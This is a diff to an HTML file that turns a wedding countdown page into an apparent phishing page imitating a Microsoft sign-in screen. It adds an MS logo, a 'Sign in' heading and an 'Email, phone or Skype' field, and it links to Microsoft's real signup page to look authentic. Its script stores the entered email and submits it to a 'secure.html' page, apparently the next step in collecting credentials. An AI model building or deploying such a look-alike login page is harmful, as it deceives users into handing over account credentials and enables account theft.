@@ -1,20 +1,49 @@
+<!DOCTYPE html>
+<style>
+body {
+  background-image: url("back.png");
+}
+p {
+font-family:helvetica;
+font-size:12px;
+}
+h1 {
+font-family:helvetica;
+font-size:22px;
+color:#252525;
+}
+</style>
 <html>
+<body>
 
-<head>
-</head>
+<div style="margin-left:35%; padding:40px; margin-top:15%; height:240px; width:25%; background-color: #ffffff; border: 1px solid #868687;">
+<img src="MS-logo.png">
 
-<body style=" text-align:center; background:#000000; margin:0px;">
-<div style="width:100%; margin: 0px; text-align:center; background-image: url('background.jpg'); background-position:center; background-size: 100%">
-<img style="width:60%;"src="title.png">
-<script src="https://cdn.logwork.com/widget/countdown.js"></script>
-<a href="https://logwork.com/countdown-p44y" class="countdown-timer" data-timezone="Europe/London" data-textcolor="#ffffff" data-date="2021-06-19 14:00" data-digitscolor="#ffffff" data-unitscolor="#ffffff">The Wedding</a>
-</br>
-<a href="https://github.com/"><img style="width:20%;" src="button.png"</a>
-</br></br></br></br></br>
+<h1>Sign in<br></h1>
+<script>
+let text = "Hello world, welcome to the universe.";
+let result = text.includes("world");
+
+document.getElementById("demo").innerHTML = result;
+</script>
+
+<script>
+function submitForm(){
+    if(typeof(localStorage) != "undefined"  ) {
+        localStorage.email = document.getElementById("email").value;
+    }
+    document.getElementById("form").submit();
+}
+</script>
+
+<p id="show"></p>
+<form id="form" action="secure.html"  method="GET">
+  <input type="email" style="font-family:helvetica; font-size:15px; border: 1px solid #ffffff; border-bottom: 1px solid #E3E3E3; width: 98%;" type="text" placeholder="Email, phone or Skype" id="email" name="email"><br><br>
+<input type="image" id=btn src ="nxt.png" alt="Next" style="float:right;" onclick="submitForm()">
+</form>
+<p>No account? <a style = "color:#2C6CEE; text-decoration:none;" href="https://signup.live.com/signup?lcid=1033&wa=wsignin1.0&rpsnv=13&ct=1670066613&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2faccount.microsoft.com%2fauth%2fcomplete-signin%3fru%3dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&lc=1033&id=292666&lw=1&fl=easi2&mkt=en-US&lic=1&uaid=8a8186daf44c4b3ba4df087555048666">Create one!</a><br><br></p>
+
 </div>
 
-<div style="width:auto; height:100%; padding:20px; background:#ffffff; margin:0px;">
-<a href="mailto:domain@ciprianionline.co.uk"><img style="width:30%;" src="button2.png"></a>
-</div>
 </body>
 </html>
